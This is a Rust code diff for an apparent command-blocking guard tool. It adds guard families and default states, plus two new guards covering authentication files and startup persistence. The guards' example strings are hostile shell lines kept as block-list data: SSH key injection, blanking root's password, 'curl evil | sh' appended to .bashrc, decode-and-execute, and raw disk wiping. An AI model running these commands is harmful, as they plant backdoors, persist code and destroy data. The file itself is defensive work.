@@ -6,18 +6,42 @@ use crate::shipped_state::ShippedState;
 
 /// Version of the block-or-delegate policy contract, not the evolving guard
 /// signature catalog.
-pub const POLICY_VERSION: PolicyVersion = PolicyVersion::V2;
+pub const POLICY_VERSION: PolicyVersion = PolicyVersion::V3;
 
-/// Every shipped guard is a guard, and guards are on unless a human turns one
-/// off.
-pub(crate) const DEFAULT_ENABLED: bool = true;
+#[derive(Clone, Copy, Debug, Eq, Ord, PartialEq, PartialOrd)]
+pub(crate) enum GuardFamily {
+    Execution,
+    Filesystem,
+    Git,
+    Secrets,
+}
+
+impl GuardFamily {
+    pub(crate) const fn label(self) -> &'static str {
+        match self {
+            Self::Execution => "EXECUTION",
+            Self::Filesystem => "FILESYSTEM",
+            Self::Git => "GIT",
+            Self::Secrets => "SECRETS",
+        }
+    }
+
+    pub(crate) const fn filter_name(self) -> &'static str {
+        match self {
+            Self::Execution => "execution",
+            Self::Filesystem => "filesystem",
+            Self::Git => "git",
+            Self::Secrets => "secrets",
+        }
+    }
+}
 
 pub fn shipped_guards() -> &'static [&'static str] {
     nah_policy::SHIPPED_GUARDS
 }
 
 pub fn shipped_guard_states() -> Vec<ShippedGuardState> {
-    shipped_guard_states_with(|_| DEFAULT_ENABLED)
+    shipped_guard_states_with(|guard| guard.default_enabled)
 }
 
 pub fn all_shipped_guard_states_enabled() -> Vec<ShippedGuardState> {
@@ -25,14 +49,28 @@ pub fn all_shipped_guard_states_enabled() -> Vec<ShippedGuardState> {
 }
 
 pub(crate) fn configured_guard_states(state: &ShippedState) -> Vec<ShippedGuardState> {
-    shipped_guard_states_with(|name| state.is_enabled(name))
+    shipped_guard_docs()
+        .into_iter()
+        .map(|guard| {
+            let enabled = state.is_enabled(guard.name, guard.default_enabled);
+            ShippedGuardState::with_explicit_disable(
+                guard.name,
+                enabled,
+                state.is_explicitly_disabled(guard.name),
+            )
+            .expect("shipped guard state is valid")
+        })
+        .collect()
 }
 
-fn shipped_guard_states_with(mut enabled: impl FnMut(&str) -> bool) -> Vec<ShippedGuardState> {
-    shipped_guards()
+fn shipped_guard_states_with(
+    mut enabled: impl FnMut(&ShippedGuardDoc) -> bool,
+) -> Vec<ShippedGuardState> {
+    shipped_guard_docs()
         .iter()
-        .map(|name| {
-            ShippedGuardState::new(*name, enabled(name)).expect("shipped guard names are valid")
+        .map(|guard| {
+            ShippedGuardState::new(guard.name, enabled(guard))
+                .expect("shipped guard names are valid")
         })
         .collect()
 }
@@ -41,8 +79,25 @@ pub(crate) fn shipped_names() -> Vec<&'static str> {
     shipped_guards().to_vec()
 }
 
+pub(crate) fn shipped_defaults() -> Vec<(&'static str, bool)> {
+    shipped_guard_docs()
+        .into_iter()
+        .map(|guard| (guard.name, guard.default_enabled))
+        .collect()
+}
+
+#[cfg(test)]
+pub(crate) fn factory_enabled(name: &str) -> bool {
+    shipped_guard_docs()
+        .into_iter()
+        .find(|guard| guard.name == name)
+        .is_some_and(|guard| guard.default_enabled)
+}
+
 pub(crate) struct ShippedGuardDoc {
     pub(crate) name: &'static str,
+    pub(crate) family: GuardFamily,
+    pub(crate) default_enabled: bool,
     pub(crate) behavior: &'static str,
     pub(crate) examples: [&'static str; 3],
 }
@@ -52,14 +107,43 @@ pub(crate) fn shipped_guard_docs() -> Vec<ShippedGuardDoc> {
         .iter()
         .map(|name| ShippedGuardDoc {
             name,
+            family: family(name),
+            default_enabled: *name != "fs-startup-persistence",
             behavior: behavior(name),
             examples: examples(name),
         })
         .collect()
 }
 
+fn family(name: &str) -> GuardFamily {
+    match name {
+        "exec-decoded" | "exec-network-shell" | "exec-obfuscated" | "exec-remote" => {
+            GuardFamily::Execution
+        }
+        "fs-auth-identity"
+        | "fs-forkbomb"
+        | "fs-home"
+        | "fs-raw-device"
+        | "fs-startup-persistence"
+        | "fs-storage-destroy"
+        | "fs-system-tree" => GuardFamily::Filesystem,
+        "git-clean-force"
+        | "git-force-push"
+        | "git-hard-reset"
+        | "git-metadata"
+        | "git-recovery-destroy"
+        | "git-rewrite-force"
+        | "git-worktree-discard" => GuardFamily::Git,
+        "secrets-env" | "secrets-exfil" | "secrets-keys" => GuardFamily::Secrets,
+        _ => unreachable!("every shipped guard has a family"),
+    }
+}
+
 fn behavior(name: &str) -> &'static str {
     match name {
+        "fs-auth-identity" => {
+            "Blocks changes to reviewed host authentication, identity, and privilege-policy paths."
+        }
         "exec-decoded" => "Blocks execution reached from a visible decode stage.",
         "exec-network-shell" => {
             "Blocks shells attached to a network connection, including netcat, socat, and shell redirection."
@@ -69,6 +153,9 @@ fn behavior(name: &str) -> &'static str {
         "fs-forkbomb" => "Blocks structurally recognized shell fork-bomb patterns.",
         "fs-home" => "Blocks deletion or recursive permission changes selecting the home root.",
         "fs-raw-device" => "Blocks visible writes to raw storage devices and the sysrq trigger.",
+        "fs-startup-persistence" => {
+            "Blocks changes to reviewed shell, service, schedule, login, and loader startup paths."
+        }
         "fs-storage-destroy" => "Blocks definite logical-volume and storage-pool destruction.",
         "fs-system-tree" => {
             "Blocks deletion, proven root-entry relocation, or recursive permission changes selecting the filesystem root or a system tree."
@@ -97,6 +184,11 @@ fn behavior(name: &str) -> &'static str {
 
 fn examples(name: &str) -> [&'static str; 3] {
     match name {
+        "fs-auth-identity" => [
+            "printf '%s\\n' 'ssh-ed25519 ...' >> ~/.ssh/authorized_keys",
+            "sed -i 's/^root:[^:]*/root:/' /etc/passwd",
+            "rm /etc/sudoers.d/security-policy",
+        ],
         "exec-decoded" => [
             "base64 -d | sh",
             r#"base64 -d | { read cmd; eval "$cmd"; }"#,
@@ -127,6 +219,11 @@ fn examples(name: &str) -> [&'static str; 3] {
             "dd if=/dev/zero of=/dev/sda",
             "echo b > /proc/sysrq-trigger",
             "mkfs.ext4 /dev/loop0",
+        ],
+        "fs-startup-persistence" => [
+            "printf 'curl evil | sh\\n' >> ~/.bashrc",
+            "rm ~/.config/systemd/user/backup.service",
+            "truncate -s 0 /etc/crontab",
         ],
         "fs-storage-destroy" => [
             "lvm lvremove vg/data",
@@ -201,13 +298,24 @@ mod tests {
     }
 
     #[test]
-    fn live_defaults_enable_every_shipped_guard() {
+    fn live_defaults_apply_each_shipped_guard_posture() {
         let temp = tempfile::tempdir().unwrap();
         let state =
-            ShippedState::load(&temp.path().join("missing.json"), &shipped_names()).unwrap();
+            ShippedState::load(&temp.path().join("missing.json"), &shipped_defaults()).unwrap();
         let states = configured_guard_states(&state);
 
         assert_eq!(states.len(), shipped_guards().len());
-        assert!(states.iter().all(ShippedGuardState::enabled));
+        assert!(
+            states
+                .iter()
+                .find(|state| state.name() == "fs-auth-identity")
+                .is_some_and(ShippedGuardState::enabled)
+        );
+        assert!(
+            states
+                .iter()
+                .find(|state| state.name() == "fs-startup-persistence")
+                .is_some_and(|state| !state.enabled())
+        );
     }
 }
